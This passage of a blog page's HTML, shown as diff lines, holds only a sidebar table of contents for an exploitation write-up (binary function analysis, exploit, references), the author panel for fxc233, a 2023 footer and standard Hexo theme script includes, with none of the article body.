href="#%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞文件分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#sub-40172C%E5%87%BD%E6%95%B0"><span class="nav-number">2.4.1.</span> <span class="nav-text">sub_40172C函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sub-4013F4%E5%87%BD%E6%95%B0"><span class="nav-number">2.4.2.</span> <span class="nav-text">sub_4013F4函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.5.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit%E6%95%88%E6%9E%9C"><span class="nav-number">3.</span> <span class="nav-text">exploit效果</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">4.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">fxc233</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fxc233</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
